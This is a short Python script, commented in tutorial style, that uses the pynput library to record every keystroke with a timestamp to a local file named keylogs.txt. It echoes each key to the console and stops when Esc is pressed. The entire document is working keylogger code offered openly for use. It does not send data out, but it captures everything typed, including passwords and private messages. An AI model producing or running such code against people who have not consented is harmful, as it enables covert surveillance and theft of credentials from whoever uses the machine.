# Built-in Modules #
import logging

# External Modules #
from pynput.keyboard import Key, Listener

# Folder location where we want to save the file
log_dir = r"."
# Using the "logging" package, we specify the location and format for our logs.
logging.basicConfig(filename = (log_dir + r"/keylogs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Defining the def "on_press" function to record keystrokes as they are pressed and print them on the console.
def on_press(key):
    try:
        print(f'Key {key.char} pressed!')
        logging.info(str(key))
    except AttributeError:
        print(f'Special Key {key} pressed!')
        logging.info(str(key))

# Defining the def "on_release" function to terminate the keylogger after pressing the esc key
def on_release(key):
    if key == Key.esc:
        return False

# Assigning def functions and starting to record keystrokes
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
